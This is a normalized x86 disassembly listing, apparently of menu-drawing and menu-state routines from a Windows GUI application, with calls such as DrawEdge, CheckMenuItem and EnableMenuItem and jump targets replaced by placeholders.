add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_4563ec
cmp ebx eax
jl r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_42516c
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_42499c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_4249a4
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_4249a4
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424d48
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_42499c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_429984
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_424978
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424d48
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424d48
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_427864
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_45a37b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_42894c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_4241d8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_4563ec
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_4249a4
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_4593d8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x5c ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_4244a4
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_42516c
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424e94
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_4566dc
jmp r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_42516c
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_424c9c
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_4241d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_403368
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_4593d8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a83f
lea eax [ ebp - 0x4 ]
call sub_404164
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_45849c
mov eax [ ebp + 0x8 ]
mov [ eax - 0x20 ] 0xa
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov edx [ ebp - 0x4 ]
call sub_424fcc
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x20 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ ebp - 0x4 ]
call sub_4593d8
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_45a98c
push ebx
xor ebx ebx
mov edx [ eax + 0x64 ]
jmp r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
cmp [ edx + 0x7c ] 0x0
je r-xdata
call sub_45b370
test eax eax
je r-xdata
mov ebx [ edx + 0x7c ]
jmp r-xdata
mov edx [ edx + 0x64 ]
mov eax ebx
pop ebx
retn
mov ebx [ eax + 0x48 ]
sub_45a9bc
push ebp
mov ebp esp
add esp 0xfffffeac
mov [ ebp - 0x154 ] 0x154
push 0x0
lea eax [ ebp - 0x154 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xbc ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xb8 ]
mov [ eax ] edx
sub_45aa08
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov edi eax
xor eax eax
push ebp
push sub_45abea
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov si 0xfff2
call sub_403564
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
xor ebx ebx
mov bl 0x1
push ebp
call sub_45a9bc
pop ecx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x5
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffffe
xor eax eax
jmp r-xdata
mov eax edi
call sub_45b370
mov esi eax
mov eax edi
call sub_45a98c
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x30 ]
mov edx r-xdata
call sub_404570
jne r-xdata
cmp [ edi + 0x4c ] 0x0
je r-xdata
cmp [ edi + 0x40 ] 0xffffffff
jg r-xdata
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffff9
xor eax eax
mov eax [ edi + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x10
test bl bl
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
lea eax [ ebp - 0x20 ]
xor ecx ecx
mov edx 0x10
call sub_402d24
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax ] 0x3
mov eax [ ebp - 0x4 ]
add [ eax ] 0xf
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x10
mov eax esi
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
xor ebx ebx
mov bl [ esi + 0x60 ]
jmp r-xdata
mov si [ edi + 0x60 ]
test si si
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_4041fc
lea edx [ ebp - 0x24 ]
mov eax esi
call sub_45849c
mov ecx [ ebp - 0x24 ]
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_404470
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45abf1
lea eax [ ebp - 0x24 ]
call sub_404164
lea eax [ ebp - 0x10 ]
call sub_404164
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ edi + 0xa4 ]
call [ edi + 0xa0 ]
xor eax eax
mov al bl
mov ax [ eax * 2 + rw-data ]
or ax 0x40
or ax 0x20
or ax 0x100
or ax 0x400
movzx eax ax
lea edx [ ebp - 0x20 ]
push edx
push 0x0
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_4593d8
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
add eax 0x7
mov edx [ ebp - 0x4 ]
add [ edx ] eax
cmp [ edi + 0xa2 ] 0x0
je r-xdata
sub_45ac1c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov edx esi
call sub_404570
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x30 ]
mov edx esi
call sub_4041b8
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45ac44
push ebx
push esi
push edi
mov ebx eax
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_45adb4
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ eax + 0x3d ] 0x0
je r-xdata
mov edx edi
mov eax [ ebx + 0x64 ]
call sub_45adc4
cmp ebx eax
je r-xdata
mov dl [ eax + 0x3f ]
cmp dl [ ebx + 0x3f ]
jne r-xdata
xor edx edx
call sub_45ac8c
sub_45ac8c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x38 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x38 ] bl
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
test bl bl
je r-xdata
test [ esi + 0x1c ] 0x2
jne r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_459348
push eax
call CheckMenuItem
mov eax esi
call sub_45ac44
sub_45ace0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x39 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x39 ] bl
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov eax esi
call sub_45adb4
test eax eax
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
jmp r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
test [ esi + 0x1c ] 0x2
jne r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_459348
push eax
call EnableMenuItem
sub_45ad58
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x3f ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov [ esi + 0x3f ] bl
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov edx esi
mov eax edi
call sub_45b118
mov edx eax
mov ecx ebx
mov eax edi
call sub_4592e8
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov eax esi
call sub_45ac44
sub_45adc4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_4188a0
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_4583f0
sub_45ae34
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_45adb4
test esi esi
jge r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax ebx
call sub_45ae1c
cmp esi eax
je r-xdata
mov esi eax
dec esi
mov edi [ ebx + 0x64 ]
mov edx ebx
mov eax edi
call sub_45b14c
mov ecx ebx
mov edx esi
mov eax edi
call sub_45af40
sub_45ae7c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_45adb4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_45adc4
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_45aed4
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x3a ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ ebp + 0x3a ] bl
mov dl 0x1
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebp + 0x64 ] 0x0
je r-xdata
mov eax [ ebp + 0x64 ]
call sub_45adb4
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_45adc4
mov [ eax + 0x3a ] 0x0
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_45adc4
cmp [ eax + 0x3a ] 0x0
je r-xdata
sub_45af40
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp [ esi + 0x64 ] 0x0
je r-xdata
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_4583f0
mov ebp edi
dec ebp
test ebp ebp
jl r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ ebx + 0x5c ] eax
mov cl [ esi + 0x3f ]
mov edx edi
mov eax ebx
call sub_4592e8
mov ecx esi
mov edx edi
mov eax [ ebx + 0x5c ]
call sub_41891c
mov [ esi + 0x64 ] ebx
mov [ esi + 0x84 ] ebx
mov [ esi + 0x80 ] sub_45b1b8
cmp [ ebx + 0x34 ] 0x0
je r-xdata
mov eax [ ebx + 0x5c ]
cmp ebp [ eax + 0x8 ]
jge r-xdata
mov eax ebx
call sub_45adb4
dec eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_459218
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_4188a0
mov al [ eax + 0x3f ]
cmp al [ esi + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_4188a0
mov dl [ eax + 0x3f ]
mov eax esi
call sub_45ad58
sub_45aff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_4583f0
cmp [ ebx + 0x5c ] 0x0
je r-xdata
mov eax ebx
call sub_45adb4
test eax eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_459218
mov eax ebx
call sub_45adb4
cmp esi eax
jl r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_4188a0
mov edi eax
